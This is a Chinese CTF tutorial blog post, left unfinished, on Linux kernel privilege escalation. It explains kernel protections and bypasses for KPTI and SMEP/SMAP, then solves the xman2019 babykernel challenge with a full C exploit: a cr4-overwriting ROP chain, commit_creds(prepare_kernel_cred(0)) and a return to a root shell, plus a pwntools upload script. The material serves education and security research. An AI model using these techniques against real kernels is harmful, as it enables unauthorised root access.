---
title: Linux Kernel 驱动提权合集 - 未完
published: true
---

| 目录跳转: |
|--------|
| [系统态是什么及系统态和提权有什么关系](#系统态是什么系统态和提权有什么关系) |
| [如何进入系统态](#如何进入系统态) |
| [关于内核态的保护及常见绕过办法](#关于内核态的保护及常见绕过办法) |
| [什么是 save_stat 和 restore_stat，以及如何提权](#什么是save_stat和restore_stat以及如何提权) |
| [题目 xman2019 babykernel](#题目-xman2019-babykernel) |

在 Linux 操作系统中 CPU 的特权级别分为四个等级：  
Ring 0、Ring 1、Ring 2、Ring 3

Ring 0 只给 OS 使用，Ring 3 运行在这个操作系统上的全部程序都可以使用  
Ring 0 可以调用系统所有资源，包括外层 Ring

提权漏洞则是由外层 Ring 通过某些特殊手段到 Ring 0 的一个过程

# [](#header-3)Kernel 详解

### [](#header-3)系统态是什么及系统态和提权有什么关系

系统态，也称为内核态（Kernel Mode），是操作系统中的一种执行模式

在系统态下，程序运行在操作系统的核心（内核）中，拥有对硬件资源的完全访问权限 (即 Ring 0 权限)  
与此相对的是用户态（User Mode），用户态是普通应用程序运行的模式，受限于操作系统的权限和安全性，无法直接访问硬件资源或执行内核操作

### [](#header-3)如何进入系统态

进入系统态（Kernel Mode）是指从用户态（User Mode）切换到内核态的过程，这通常发生在操作系统中执行系统调用、处理中断或异常时。进入系统态的主要方式是通过以下几种途径：

1. 系统调用 (System Call)  
    系统调用是用户态程序与内核之间的接口，程序通过系统调用向内核请求服务。当用户程序调用某个系统调用时，会发生上下文切换，CPU 会从用户态切换到内核态，进入系统态执行内核代码。

    常见的系统调用示例：  

    `read()`：读取文件  
    `write()`：写入文件  
    `open()`：打开文件  
    `ioctl()`：控制设备  

2. 内核线程或驱动程序（Kernel Threads / Drivers）  
    内核中的线程或驱动程序通常在内核态运行。当内核需要执行某些任务时（如设备驱动、文件系统操作等），它会直接进入内核态执行这些操作，而无需从用户态进行切换。


3. 异常（Exception）、中断（Interrupt）
   
4. ...
   
本篇文章将会首先分析驱动程序、内核扩展模块中隐藏的提权漏洞，然后进行

### [](#header-3)关于内核态的保护及常见绕过办法

在内核态中主要有以下几种基本保护方式

```
基本保护措施如下所示：
KPTI：Kernel PageTable Isolation，内核页表隔离
KASLR：内核地址空间布局随机化，类似于 ASLR
SMEP：管理模式执行保护
SMAP：管理模式访问保护
Stack Protector: 类似于Canary
kptr_restrict：允许查看内核函数地址
dmesg_restrict：允许查看printk函数输出，用dmesg命令来查看
MMAP_MIN_ADDR：不允许申请NULL地址 mmap(0,....)
```

1. 其中，KASLR、Stack Protector 与平常见到的 Pwn 题的 ASLR、Canary 没什么大区别  

2. SMEP 中的 E 为 Execution，旨在防止内核态时执行用户态代码. 其开关在 cr4 寄存器的第 20 位值，当该位为 1 时即为开启，可以通过修改该位来关闭 SMEP  
SMAP 中的 E 为 Access，旨在防止内核态时访问用户态数据. 其开关在 cr4 寄存器的第 21 位值，当该位为 1 时即为开启，可以通过修改该位来关闭 SMEP  

	`cr4寄存器各位作用一览`  
	![qwb](/image/kernelpwn/5.png)  

	SMEP、SMAP 绕过例子:  
	[题目 xman2019 babykernel](#题目-xman2019-babykernel)

3. KPTI 是用来完全分离 用户态页表 和 内核态页表 的一种保护特性, KPTI中每个进程有两套页表：内核态页表、用户态页表  

	KPTI 保护切换页表是通过 cr3 寄存器来控制的, 当 cr3 第 13 位为 1，就可从内核态页表切换到用户态页表. 如果在返回用户态(iretq)前不设置 cr3 寄存器第 13 位的值，就会导致找不到正确的页，引发段错误.  

	内核态页表只能在内核态下访问，可以创建到内核和用户的映射(不过用户空间受 SMAP 和 SMEP 保护，在开启了 KPTI 情况下默认 SMAP、SMEP)    
	用户态页表只包含用户空间。不过由于涉及到上下文切换，所以在用户态页表中必须包含部分内核地址，用来建立到中断入口和出口的映射  

	绕过 KPTI: 
	1. signal(SIGSEGV, func_shell);
	
		已知内核态执行任何用户态代码时会报出信号 SIGSEGV. 即然如此，就在程序一开始时设置 `signal(SIGSEGV, func_shell);`，将 SIGSEGV 与命令执行函数绑定在一起，这样

		```c
		#include<stdio.h>
		#include<stdlib.h>
		#include<string.h>
		#include<sys/ioctl.h>
		#include<fcntl.h>
		#include<unistd.h>
		#include<signal.h>

		void trigger(){
			//这是一个用来触发 SIGSEGV 的函数
		}

		void SIGSEGV_shell(){
			system("/bin/sh");
			return;
		}

		int main(){
			signal(SIGSEGV,SIGSEGV_shell);
			save_status();
			...
			payload[l ++] = (size_t)trigger;

			payload[l ++] = user_cs;
			payload[l ++] = user_rflags;
			payload[l ++] = user_sp;
			payload[l ++] = user_ss;
		}
		```

	2. 修改 cr3
   
		可以利用内核映像中现有的 gadget，在 iretq 前使得 cr3 寄存器第 13 位的值置为 1 即可

		```assembly
		mov     rdi, cr3
		or      rdi, 1000h
		mov     cr3, rdi
		```

		也可以使用 `swapgs_restore_regs_and_return_to_usermode` 这个函数返回  
		首先输入命令 `cat /proc/kallsyms| grep swapgs_restore_regs_and_return_to_usermode` 找到其在内核中的地址，然后构造 栈中数据如下所示，使得 ip 跳转到 `swapgs_restore_regs_and_return_to_usermode` 中的命令 `mov     rdi, rsp` 处

		```assembly
		swapgs_restore_regs_and_return_to_usermode

		pop     r15
		pop     r14
		pop     r13
		pop     r12
		pop     rbp
		pop     rbx
		pop     r11
		pop     r10
		pop     r9
		pop     r8
		pop     rax
		pop     rcx
		pop     rdx
		pop     rsi
		mov     rdi, rsp            //跳转到此处
		mov     rsp, gs: 0x5004
		push    qword ptr [rdi+30h]
		push    qword ptr [rdi+28h]
		push    qword ptr [rdi+20h]
		push    qword ptr [rdi+18h]
		push    qword ptr [rdi+10h]
		push    qword ptr [rdi]
		push    rax
		nop
		mov     rdi, cr3            //将 cr3 寄存器的值赋值给 rdi
		jmp     _临时地址  

		_临时地址
		or      rdi, 1000h          //与下一句，修改 cr3 值的第 13 位为 1
		mov     cr3, rdi
		pop     rax
		pop     rdi
		call    cs: SWAPGS
		jmp     cs: INTERRUPT_RETURN

		_SWAPGS
		push    rbp
		mov     rbp, rsp
		swapgs
		pop     rbp
		retn

		_INTERRUPT_RETURN
		test    byte ptr [rsp+0x20], 4
		jnz     native_irq_return_ldt
		iretq
		```

		```stack
		rsp:   mov_rdi_rsp 的地址
    	       0  
               0
               rip         的值
               cs          的值
               rflags      的值
               rsp         的值
               ss          的值
		```


### [](#header-3)什么是save_stat和restore_stat以及如何提权

相信了解过 kernel pwn 的读者都知道，在打开驱动进入内核态前必须要调用 save_stat 将 cs(代码段寄存器)、ss(栈段寄存器)、rsp(栈寄存器)、rflags(标志位寄存器) 的值放入全局变量.   
这一操作本身不是必要的，记录这些寄存器的值的目的是防止在 内核态 手动返回到 用户态时，失去用户态上下文(或者说失去用户态的寄存器值)  

需要注意的是，在此过程中不能破坏原先栈结构.  

```c
unsigned long long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
	asm(
		"movq %%cs, %0;"
		"movq %%ss, %1;"
		"movq %%rsp, %2;"
		"pushfq;"
		"popq %3;"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

int main(){
	save_stat();
	...
}
```

当后续进行了一系列特权操作提升权限 `如: commit_creds(prepare_kernel_cred(0))` 后，  
即可手动将存储的 ss、sp、rflags、cs push 到栈上，并且设置 rip 返回地址，最终调用 iretq

```c
void restore_stat()
{
	commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq   %0;"
		"pushq   %1;"
		"pushq   %2;"
		"pushq   %3;"
		"pushq   $shell;"
		"pushq   $0;"
		"swapgs;"
		"popq    %%rbp;"
		"iretq;"
	::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
}
```

当调用 iretq 时，栈结构如下所示. iretq 按如下结构恢复各个寄存器的值并返回到用户态，结束

```stack
rsp:   rip    的值
       cs     的值
       rflags 的值
       sp     的值
       ss     的值
```

那么 `commit_creds(prepare_kernel_cred(0))` 到底干了什么？`prepare_kernel_cred(0)` 这个函数会使我们分配一个新的cred结构(uid=0, gid=0等)，再使用 `commit_creds` 并且把它应用到调用进程后，此时我们就是root权限了. `commit_creds` 和 `prapare_kernel_cred` 都是内核函数,一般可以通过 `cat /proc/kallsyms` 查看他们的地址，但是必须需要root权限


### [](#header-3)题目 xman2019 babykernel

题目下载：[babykernel.zip](/image/kernelpwn/babykernel.zip)

首先启动该机器，在根目录下发现 flag，其权限为 -r--------，只有 root 用户能读取

![qwb](/image/kernelpwn/3.png)  

此处是通过 /dev/mychrdev 提权，对文件系统进行解包分析后，提取出驱动原文件 [babykernel.ko](/image/kernelpwn/babykernel.ko)  
使用 IDA 反编译发现其中包含栈溢出点位，若用户写入该驱动的 buf 超过 80 个字节大小，即导致栈溢出 

![qwb](/image/kernelpwn/4.png)  

接下来在 驱动中下断点，在运行到合适位置后观察 cr4 寄存器可以发现存在 SMAP 和 SMEP 保护

![qwb](/image/kernelpwn/1.png)  

什么是 SMAP 和 SMEP？这是两种 Linux 内核中的保护措施，旨在防御攻击者轻易利用漏洞

在开启 SMEP 后，内核态不允许执行用户态代码  
在开启 SMAP 后，内核态不允许访问用户态数据  
这两个防护措施是否开启通过 cr4 寄存器判断. 通常情况下，当开启了这两个防护措施，攻击者可以通过修改 cr4 寄存器的值来关闭这两个措施. 

cr4 寄存器的结构如下所示. 可以发现，SMAP、SMEP 保护开关位置在于 cr4 寄存器端的第 21、20 位:  

![qwb](/image/kernelpwn/5.png)  

很明显，在程序中 cr4 寄存器的值为如下值:  
`01100000000011011110000`  
需要将第 20、21 位置为 0，则变为如下值:  
`00000000000011011110000`  
该值转为 0x6f0，于是只需要搞个 rop 利用链将 cr4 的值赋值为 0x6f0 即可. 

```c
//修改 cr4 的值为 0x6f0 以关闭 SMAP、SMEP
buf[i ++] = 0xffffffff81045600;  // mov rax,rbx; pop rbx; pop rbp; ret;
buf[i ++] = 0x6f0;
buf[i ++] = 0x10;
buf[i ++] = 0xffffffff81045600;  // mov rax,rbx; pop rbx; pop rbp; ret;
buf[i ++] = 0x6f0;
buf[i ++] = 0;
buf[i ++] = 0xffffffff81003cf8;  // mov cr4,rax; pop rbp; ret;
buf[i ++] = 0;
buf[i ++] = &templine;
```

修改后的 cr4 寄存器如下所示，可以观察到已经关闭了 SMAP、SMEP

![qwb](/image/kernelpwn/2.png)  

payload:  
```c
#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>

#define KERNCALL __attribute__((regparm(3)))

// cat /proc/kallsyms | grep "prepare_kernel_cred"
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810779b0; // TODO:change it
// cat /proc/kallsyms | grep "commit_creds"
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff81077620; // TODO:change it

unsigned long long user_cs, user_ss, user_rflags, user_sp;
unsigned long long base_addr, canary;

int fd;
int BUFF_SIZE = 96;

void save_stat() {
	asm(
		"movq %%cs, %0;"
		"movq %%ss, %1;"
		"movq %%rsp, %2;"
		"pushfq;"
		"popq %3;"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void restore_stat()
{
	commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq   %0;"
		"pushq   %1;"
		"pushq   %2;"
		"pushq   %3;"
		"pushq   $shell;"
		"pushq   $0;"
		"swapgs;"
		"popq    %%rbp;"
		"iretq;"
	::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
}

void shell()
{
        char buffer[100];
        int in = open("/flag", O_RDONLY,S_IRUSR); 
        int flag = read(in, buffer, 1024);
        write(1, buffer, flag);
        exit(0);
}

unsigned long long int calc(unsigned long long int addr) {
    return addr - 0xffffffff81000000 + base_addr;
}

int main() {
	save_stat();
	fd = open("/dev/mychrdev", 2);
	if (fd < 0) {
		printf("[-] bad open device\n");
		exit(-1);
	}
    	
	void* buf[0x1000];
	int i = 0x58 / 8;
 	//修改 cr4 寄存器的值为 0x6f0，以关闭 SMAP、SMEP
	buf[i ++] = 0xffffffff81045600;  // mov rax,rbx; pop rbx; pop rbp; ret;
	buf[i ++] = 0x6f0;
	buf[i ++] = 0x10;
	buf[i ++] = 0xffffffff81045600;  // mov rax,rbx; pop rbx; pop rbp; ret;
	buf[i ++] = 0x6f0;
	buf[i ++] = 0;
	buf[i ++] = 0xffffffff81003cf8;  // mov cr4,rax; pop rbp; ret;
	buf[i ++] = 0;
	buf[i ++] = &restore_stat;
	write(fd, buf, 0x100);
}

```

```python
from pwn import *
import time

# ------------- ssh远程连接配置 -------------
HOST = "127.0.0.1"
PORT =  22
USER = "root"
PW = "123456"

# ------------- debug函数 -------------
# 必须在 qemu 启动参数中加入 如下参数, 才能debug
# -gdb tcp::2234 -S \ 
def debug(query = ''):
	subprocess.Popen(["qterminal", "-e", f'''bash -c 'pwndbg ./.kernel_exp -ex "set telescope-skip-repeating-val off" -ex "target remote :2234" -ex "{query}" ' '''])

# ------------- end -------------


os.chdir("./debug/babykernel")

def compile():
	print("compiling...")
	os.system("musl-gcc -g -w -static -o3 kernel_exp1.c -o .kernel_exp")

def exec_cmd(cmd):
	print(cmd)
	r.sendline(cmd)
	r.recvuntil("$")

def upload():
	with open(".kernel_exp", "rb") as f:
		data = f.read()
	encoded = base64.b64encode(data).decode()
	
	r.recvuntil("$")
	for i in range(0, len(encoded), 300):
		exec_cmd(f'''echo "{ encoded[i: i + 300] }" | base64 -d >> /exp''')
	
	exec_cmd("chmod +x /exp")

def exploit(r):
	upload()
	r.interactive()

compile()

r = None
if False:
	session = ssh(USER, HOST, PORT, PW)
	r = session.run("/bin/sh")
else:
	r = process("./start.sh")
    #debug()
	
exploit(r)
```

本篇文章参考了:  
[Linux Kernel Pwn 初探 - T3LS](https://xz.aliyun.com/t/7625)

### [](#header-3)题目：xman2020 level2

(未完)